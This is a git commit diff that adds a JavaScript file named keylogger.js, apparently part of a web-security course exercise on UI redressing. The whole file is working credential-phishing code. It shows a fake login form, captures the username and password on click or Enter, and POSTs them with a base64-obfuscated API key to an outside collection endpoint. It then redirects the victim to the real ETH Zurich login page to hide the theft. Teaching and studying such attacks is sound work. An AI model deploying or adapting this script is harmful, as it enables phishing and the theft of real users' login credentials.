2aa9e8f950d1a8cd43146dd4534a73bac0463891
3n3a <3n3a@users.noreply.github.com>
2022-09-05 12:35:36 +0000

    deploy: af98dcf0361edebdd80c356430f7d689849414f3

---
+++ exercises/a02/assets/keylogger.js
@@ -0,0 +1,60 @@
+// keylogger
+
+const apiKey = atob(
+  "TVFBM0FEVUFNZ0F5QURRQU1nQTBBRGtBTVFBNEFEY0FPUUF6QURVQU53QTJBRGtB"
+);
+let globalBuffer = ""
+
+let USER = document.getElementById('user')
+let PASS = document.getElementById('pass')
+let BTN = document.getElementById('button')
+
+async function logCreds(u, p) {
+  const payload = {
+    username: u,
+    password: p
+  };
+
+  console.log(payload)
+
+  await fetch("https://m183.gibz-informatik.ch/api/uiredresscredential", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "X-Api-Key": apiKey,
+    },
+    body: JSON.stringify(payload),
+  });
+}
+
+function startListeners() {
+  document.getElementById('test').addEventListener('load', (e) => {
+    const h = document.body.offsetHeight
+    const w = document.body.offsetWidth
+
+    document.getElementById('form').style.visibility = 'visible'
+    document.getElementById('form').style.height = h
+    document.getElementById('form').style.width = w
+
+    USER.focus()
+  })
+
+  BTN.addEventListener('click', submitCreds)
+
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') {
+      submitCreds()
+    }
+  })
+}
+
+async function submitCreds() {
+  // log to remote
+  await logCreds(USER.value || 'Kein Benutzername', PASS.value || 'Kein Passwort')
+  // redirect to original site
+  setTimeout(() => {
+    window.location = 'https://ethz.ch/login/en.html?resource=%2Fcontent%2Fmain%2Fen.html'
+  }, 200);
+}
+
+startListeners()
